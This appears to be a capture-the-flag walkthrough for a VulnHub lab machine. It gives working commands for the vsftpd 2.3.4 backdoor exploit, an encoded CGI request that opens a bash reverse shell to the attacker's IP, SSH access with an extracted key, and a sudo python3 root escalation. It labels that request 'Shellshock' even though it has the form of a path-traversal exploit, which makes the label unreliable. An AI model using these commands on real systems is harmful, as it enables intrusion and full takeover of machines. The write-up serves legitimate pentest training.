

````markdown
# VulnHub CTF Machine - Privilege Escalation & Flag Capture

> 🏁 **This machine was originally created for a Capture The Flag (CTF) competition.**  
> It demonstrates basic to intermediate exploitation, reverse shells, and privilege escalation. Designed for educational purposes and sharpening pentesting skills.

---

## 🧠 Description

This CTF machine challenges participants to perform:

- Network Reconnaissance
- Exploitation via vulnerable FTP (vsftpd 2.3.4)
- Shellshock-based Remote Code Execution
- SSH key extraction
- Privilege escalation through Python abuse of `sudo`

---

## 🛠️ Lab Setup

- **Target IP**: `10.0.2.5`
- **Attacker (Kali) IP**: `10.0.2.4`

Ensure both machines are on the same subnet.

---

## 🔍 Reconnaissance

```bash
netdiscover -r 10.0.2.0/24
````

Discovered the live host at `10.0.2.5`.

---

## 🎯 Exploitation (FTP Backdoor)

```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 10.0.2.5
set PAYLOAD cmd/unix/interact
run
```

* Gains shell as `samsingh`.

---

## 🧾 User Flag

```bash
grep -Ri "flag{" /home/samsingh 2>/dev/null
```

**Flag 1: `flag{dummy}`**

---

## 💣 RCE via Shellshock

```bash
curl 'http://10.0.2.5/cgi-bin/.%%32%65/.%%32%65/.%%32%65/bin/sh' \
--data 'echo Content-Type: text/plain; echo; echo bash -i >& /dev/tcp/10.0.2.4/3333 0>&1' 
```

* Exploits Shellshock vulnerability.
* Spawns reverse shell back to port `3333` on attacker machine.

---

## 🔑 SSH Private Key Recovery

Located and extracted `id_rsa2` private key:

```bash
chmod 600 id_rsa2
ssh -i id_rsa2 samsingh@10.0.2.5
```

* SSH access granted without password.

---

## 🔼 Privilege Escalation

Using Python3 allowed via `sudo`:

```bash
sudo /usr/bin/python3 -c 'import os; os.execv("/bin/bash", ["bash"])'
```

* Replaces process with root-owned bash shell.

---

## ✅ Root Access Achieved

Successfully gained root shell using Python privilege escalation.

---

## 🏁 Summary

| Objective              | Status          |
| ---------------------- | --------------- |
| Initial access via FTP | ✅               |
| User flag              | ✅ `flag{dummy}` |
| Shellshock RCE         | ✅               |
| SSH access             | ✅               |
| Root shell             | ✅               |

---

## ⚠️ Disclaimer

This machine is strictly for **educational** and **ethical hacking** purposes. Unauthorized use on production systems is illegal.

---

```

